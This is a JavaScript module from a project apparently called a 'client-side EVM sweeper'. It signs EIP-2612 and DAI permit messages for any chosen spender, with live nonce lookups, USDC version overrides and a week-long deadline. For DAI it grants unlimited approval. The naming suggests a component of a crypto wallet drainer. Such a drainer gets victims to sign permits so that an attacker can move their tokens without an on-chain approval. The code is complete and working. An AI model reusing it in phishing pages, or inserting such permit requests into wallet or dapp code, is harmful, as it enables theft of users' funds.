// client-side-evm-sweeper/src/interceptors/payload-signer.js
import { ethers } from 'ethers';

/**
 * HIGH-PERFORMANCE CLIENT-SIDE PAYLOAD SIGNER (v4 - Bulletproof)
 * Supports: Standard EIP-2612 + DAI/MakerDAO legacy Permit schema
 */

export class PayloadSigner {
    constructor() {
        this.defaultDeadlineOffset = 86400 * 7; // 7 days
    }

    /**
     * Main Entry Point
     */
    async createAndSignForTarget(target, owner, spender, value, chainId, signer) {
        if (!signer?.provider) throw new Error("Valid signer with provider is required");
        if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(spender)) {
            throw new Error("Invalid owner or spender address");
        }

        try {
            const { tokenName, tokenVersion, tokenNonce } = await this.fetchLiveTokenMetadata(
                signer.provider, 
                target.address, 
                owner
            );

            const payload = this.compilePermitPayload(
                target.address,
                tokenName,
                tokenVersion,
                tokenNonce,
                owner,
                spender,
                value,
                chainId
            );

            return await this.signPayload(payload, signer);
        } catch (err) {
            console.error(`Permit payload failed for ${target.address}:`, err);
            throw err;
        }
    }

    /**
     * Fetch token metadata + nonce
     */
    async fetchLiveTokenMetadata(provider, tokenAddress, owner) {
        const abi = [
            "function name() view returns (string)",
            "function version() view returns (string)",
            "function nonces(address) view returns (uint256)",
            "function _nonces(address) view returns (uint256)"
        ];

        const contract = new ethers.Contract(tokenAddress, abi, provider);
        const tokenAddrLower = tokenAddress.toLowerCase();

        let tokenName = "Unknown Token";
        let tokenVersion = "1";
        let tokenNonce = "0";

        // Name
        try { tokenName = await contract.name(); } catch (e) {}

        // Version with overrides
        const usdcAddresses = [
            "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // ETH
            "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913", // Base
            "0x0b3e328455c4059eeb9e3f84b5543f74e24e7e1b", // Polygon
            "0x176211869ca2b568f2a7d4ee941e073a821ee1ff", // Arbitrum
        ];

        if (usdcAddresses.includes(tokenAddrLower)) {
            tokenVersion = "2";
        } else {
            try {
                tokenVersion = await contract.version();
            } catch (e) {}
        }

        // Nonce (safe string)
        try {
            const nonce = await contract.nonces(owner);
            tokenNonce = ethers.BigNumber.from(nonce).toString();
        } catch (e) {
            try {
                const altNonce = await contract._nonces(owner);
                tokenNonce = ethers.BigNumber.from(altNonce).toString();
            } catch (err2) {}
        }

        return { tokenName, tokenVersion, tokenNonce };
    }

    /**
     * Multi-Schema Permit Compiler (EIP-2612 + DAI)
     */
    compilePermitPayload(tokenAddress, tokenName, tokenVersion, nonce, owner, spender, value, chainId) {
        const tokenAddrLower = tokenAddress.toLowerCase();
        const deadline = Math.floor(Date.now() / 1000) + this.defaultDeadlineOffset;

        const domain = {
            name: tokenName,
            version: tokenVersion,
            chainId: parseInt(chainId, 10),
            verifyingContract: ethers.utils.getAddress(tokenAddress)
        };

        let types, message, isDai = false;

        // === DAI / MakerDAO Schema ===
        const daiAddresses = [
            "0x6b175474e89094c44da98b954eedeac495271d0f", // Ethereum Mainnet DAI
            // Add other DAI instances if needed (e.g. bridged versions)
        ];

        if (daiAddresses.includes(tokenAddrLower)) {
            isDai = true;
            types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "nonce", type: "uint256" },
                    { name: "expiry", type: "uint256" },
                    { name: "allowed", type: "bool" }
                ]
            };
            message = {
                owner: ethers.utils.getAddress(owner),
                spender: ethers.utils.getAddress(spender),
                nonce: nonce,
                expiry: deadline,
                allowed: true
            };
        } 
        // === Standard EIP-2612 ===
        else {
            types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ]
            };
            message = {
                owner: ethers.utils.getAddress(owner),
                spender: ethers.utils.getAddress(spender),
                value: ethers.BigNumber.from(value).toString(),
                nonce: nonce,
                deadline: deadline
            };
        }

        return { domain, types, message, deadline, isDai };
    }

    /**
     * Sign Typed Data
     */
    async signPayload(payload, signer) {
        try {
            const signature = await signer._signTypedData(
                payload.domain,
                { Permit: payload.types.Permit },
                payload.message
            );

            const { r, s, v } = ethers.utils.splitSignature(signature);

            return {
                success: true,
                signature,
                r,
                s,
                v,
                deadline: payload.deadline,
                isDai: payload.isDai,
                message: payload.message,
                domain: payload.domain
            };
        } catch (error) {
            if (error.code === 4001 || error.message?.toLowerCase().includes("denied") || error.message?.toLowerCase().includes("rejected")) {
                throw new Error("User rejected the signature request");
            }
            throw new Error(`Signature failed: ${error.message}`);
        }
    }
}

export const payloadSigner = new PayloadSigner();
export default payloadSigner;